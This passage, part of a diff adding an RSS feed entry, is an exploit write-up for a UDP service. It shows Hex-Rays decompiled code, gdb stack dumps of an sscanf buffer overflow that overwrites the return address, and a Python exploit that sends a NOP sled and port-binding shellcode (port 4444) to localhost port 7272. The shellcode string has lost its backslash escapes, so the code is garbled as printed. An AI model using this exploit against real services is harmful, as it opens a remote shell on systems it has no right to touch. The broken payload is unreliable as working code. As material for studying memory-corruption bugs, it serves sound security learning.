+</pre>
+
+<p>yes, this is my packet payload!</p>
+
+<p>Here is the source of this function using Hexrays:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">void *__cdecl sub_804CC90(const char *a1, int a2)
+{
+  int v3; // ST0C_4@6
+  int v4; // ST10_4@6
+  int v5; // ST14_4@6
+  char s; // [sp+1Eh] [bp-1FEh]@1
+  int v7; // [sp+20Ch] [bp-10h]@1
+  char v8; // [sp+1E8h] [bp-34h]@1
+  int v9; // [sp+118h] [bp-104h]@1
+  int v10; // [sp+208h] [bp-14h]@1
+  char src; // [sp+198h] [bp-84h]@5
+
+  memset(&amp;s, 0, 0xFAu);
+  if ( sscanf(a1, "%d %s %s %s %d", &amp;v7, &amp;v8, &amp;s, &amp;v9, &amp;v10) != 5 )
+  {
+    puts("incorrect request");
+    return (void *)-1;
+  }
+  if ( v7 &lt; 0 || v7 &gt; 1 &amp;&amp; v7 != 3 )
+  {
+    sub_804CBC0((int)&amp;s, (int)&amp;src);
+LABEL_9:
+    v5 = a2;
+    v4 = (int)&v9;
+    v3 = 2;
+    goto LABEL_10;
+  }
+  if ( sub_804CBC0((int)&amp;s, (int)&amp;src) &lt; 0 )
+    goto LABEL_9;
+  v5 = a2;
+  v4 = (int)&v9;
+  v3 = 0;
+LABEL_10:
+  sub_804CB30(&amp;v8, v7, v10, v3, v4, v5);
+  return memcpy((void *)(a2 + 44), &amp;src, 0x50u);
+}
+</pre>
+
+<p>sscanf seems to be a potential vulnerable. Lets try to break before and after this function to see different on stack :</p>
+
+<p>Before:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">(gdb) x/200x $esp
+0xbfc352b0:	0xbfc35508	0x0805a300	0xbfc354d8	0xbfc354b4
+0xbfc352c0:	0xbfc352ea	0xbfc353e4	0xbfc354d4	0xb7f27e78
+0xbfc352d0:	0x00000001	0xb7f70fc4	0xb7f3f1b8	0x7972d654
+0xbfc352e0:	0xbfc353b4	0xb7f5d999	0x000053a4	0x00000000
+0xbfc352f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc35300:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc35310:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc35320:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc35330:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc35340:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc35350:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc35360:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc35370:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc35380:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc35390:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc353a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc353b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc353c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc353d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfc353e0:	0x00000000	0xb7f3bff4	0xb7d75b90	0xb7d754d0
+0xbfc353f0:	0xbfc35458	0xb7f681e0	0xbfc35474	0xbfc35468
+0xbfc35400:	0xb7d754d0	0xb7d75b90	0xbfc354b0	0xb7f71658
+0xbfc35410:	0x080488cc	0xb7d754d0	0x00000000	0x00000000
+0xbfc35420:	0xb7d75bd8	0xbfc3543c	0xb7d75bd8	0x00000001
+0xbfc35430:	0xb7ded684	0xb7f37380	0xb7d75b90	0x00000006
+0xbfc35440:	0xbfc354b8	0x00000001	0x00000081	0xb7f337d6
+0xbfc35450:	0x00000000	0xb7d754b4	0xb7f3bff4	0xb7f2d4b6
+0xbfc35460:	0x003d0f00	0xb7f2d080	0xb7f283d8	0xb7f3f000
+0xbfc35470:	0xffffffff	0xffffffff	0xb7f70fc4	0xb7f71658
+0xbfc35480:	0x08048620	0xbfc354c0	0xb7f62616	0xb7f71810
+0xbfc35490:	0xb7f3f5b0	0x00000001	0x00000005	0x00000000
+0xbfc354a0:	0x080488cc	0x00000000	0x0805c0dc	0x00000005
+0xbfc354b0:	0xb7f283d8	0xbfc35de8	0xbfc35cd8	0xbfc35fe0
+0xbfc354c0:	0xbfc361b8	0xb7f681e0	0xbfc361b8	0xbfc35de8
+0xbfc354d0:	0xbfc361b8	0xb7f33e90	0xbfc35cd8	0xbfc35de8
+0xbfc354e0:	0xbfc35cd8	0xbfc35fe0	0xbfc361b8	0x0804d63d
+</pre>
+
+<p>And after the overflow, lets see the value of char v8; // [sp+1E8h] [bp-34h]@1 is :</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">(gdb) x/20x $ebp-0x34
+0xbfc354b4:	0x306141ff	0x41316141	0x61413261	0x34614133
+0xbfc354c4:	0x41356141	0x61413661	0x38614137	0x41396141
+0xbfc354d4:	0x62413062	0x32624131	0x41336241	0x62413462
+0xbfc354e4:	0x36624135	0x41376241	0x62413862	0x30634139
+0xbfc354f4:	0x41316341	0x63413263	0x34634133	0x41356341
+</pre>
+
+<p>/xff+”Aa0Aa1Aa…. -&gt; is our string. So we can see sscanf() causes buffer overflow. We will stepi after sscanf and see:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">(gdb) x/4i $eip
+0x804cce9 &lt;difftime@plt+15297&gt;:	mov    $0xffffffff,%eax
+0x804ccee &lt;difftime@plt+15302&gt;:	lea    -0xc(%ebp),%esp
+0x804ccf1 &lt;difftime@plt+15305&gt;:	pop    %ebx
+0x804ccf2 &lt;difftime@plt+15306&gt;:	pop    %esi
+(gdb) stepi
+0x0804ccee in ?? ()
+(gdb) stepi
+0x0804ccf1 in ?? ()
+(gdb) x/4x $esp
+0xbfdb7fbc:	0x41336241	0x62413462	0x36624135	0x41376241
+(gdb) x/i $eip
+0x804ccf1 &lt;difftime@plt+15305&gt;:	pop    %ebx
+(gdb) stepi
+0x0804ccf2 in ?? ()
+(gdb) x/4i $eip
+0x804ccf2 &lt;difftime@plt+15306&gt;:	pop    %esi
+0x804ccf3 &lt;difftime@plt+15307&gt;:	pop    %edi
+0x804ccf4 &lt;difftime@plt+15308&gt;:	pop    %ebp
+0x804ccf5 &lt;difftime@plt+15309&gt;:	ret
+(gdb) stepi
+0x0804ccf3 in ?? ()
+(gdb) stepi
+0x0804ccf4 in ?? ()
+(gdb) stepi
+&lt;p&gt;Breakpoint 7, 0x0804ccf5 in ?? ()
+(gdb) x/4x $esp
+0xbfdb7fcc:	0x62413862	0x30634139	0x41316341	0x63413263
+(gdb) x/i $eip
+0x804ccf5 &lt;difftime@plt+15309&gt;:	ret
+(gdb)
+</pre>
+
+<p>Now it will return on 0×62413862. It’s a basic buffer overflow!</p>
+
+<p>And here is my exploit code (shellcode is a port-binding shellcode on port 4444):</p>
+
+<pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/python
+from socket import *
+import struct
+
+host = "localhost"
+port = 7272
+shellcode ="AAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Abxe0xe6xffxbf"+"x90"*900+"xb8xb6x0ax95x0exd9xf7xd9x74x24xf4x31xc9x5dxb1x14x83xedxfcx31x45x10x03x45x10x54xffxa4xd5x6fxe3x94xaaxdcx8ex18xa4x03xfex7bx7bx43xa4xddxd1x2bxa4xe0xc4xf7x30xf5xb7x57x4cx14x5dx31x16x1ax22x34xe7xa0x90x42x58xcex1bxcaxdbxbfxc2x07x5bx2cx53xfdx63x0bxa9x81xd5xd2xc9xe9xcax0bx59x81x7cx7bxffx38x13x0ax1cxeaxb8x85x02xbax34x5bx44"
+payload = "x30xff"+shellcode
+sock = socket(AF_INET,SOCK_DGRAM)
+sock.sendto(payload,(host,port))
+sock.close()
+</pre>
+
+<p>And result :</p>
+
+<p><img src="http://img215.imageshack.us/img215/3538/screenshot5wz.png" alt="exploit" /></p>
+
+<h3 id="references">References:</h3>
+
+<ul>
+  <li><a href="http://www.rane.com/note161.html" target="_blank">http://www.rane.com/note161.html</a></li>
+  <li><a href="http://www3.rad.com/networks/applications/snmp/main.htm" target="_blank">http://www3.rad.com/networks/applications/snmp/main.htm</a></li>
+</ul>
+
+
+  ]]></description>
+</item>
+
+</channel>
+</rss>
